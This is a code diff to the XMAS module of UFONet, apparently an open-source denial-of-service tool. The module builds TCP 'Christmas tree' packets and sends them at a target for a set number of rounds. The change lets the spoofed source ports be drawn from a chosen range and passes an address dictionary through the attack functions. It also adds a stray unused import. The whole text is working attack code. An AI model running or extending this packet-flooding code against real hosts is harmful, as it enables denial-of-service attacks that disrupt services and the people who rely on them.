@@ -9,6 +9,7 @@ You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
+from re import X
 import sys, random, socket
 import netifaces as ni
 
@@ -34,6 +35,10 @@ def randInt():
     x = random.randint(1,65535) # TCP ports
     return x
 
+def randPort(start, end):
+    x = random.randint(start, end)
+    return x
+
 def get_iface(source):
     for ifname in ni.interfaces():
         try:
@@ -46,16 +51,20 @@ def get_iface(source):
             return ifname
     return ""
 
-def xmasize(ip, sport, rounds, source = None):
+def xmasize(ip, sport, rounds, address_dicts):
     n=0
     xmas_sent = 0
+    source = address_dicts['source']
     ifname = get_iface(source)
     if len(ifname) > 0:
         s = conf.L3socket(iface = ifname)
     try:
         for x in range (0,int(rounds)):
             n=n+1
-            s_zombie_port = randInt() 
+            if address_dicts['start'] is not None and address_dicts['end'] is not None:
+                s_zombie_port = randPort(int(address_dicts['start']), int(address_dicts['end']))
+            else:
+                s_zombie_port = randInt() 
             seq = randInt()
             window = randInt()
             IP_p = IP()
@@ -94,7 +103,7 @@ def xmasize(ip, sport, rounds, source = None):
         print("[Error] [AI] [XMAS] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class XMAS(object):
-    def attacking(self, target, rounds, source = None):
+    def attacking(self, target, rounds, address_dict):
         print("[Info] [AI] TCP 'Christmas Tree' (XMAS) is ready to fire: [" , rounds, "ionized quartzs ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -118,4 +127,4 @@ class XMAS(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [XMAS] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        xmasize(ip, sport, rounds, source) # attack with XMAS using threading
+        xmasize(ip, sport, rounds, address_dict) # attack with XMAS using threading
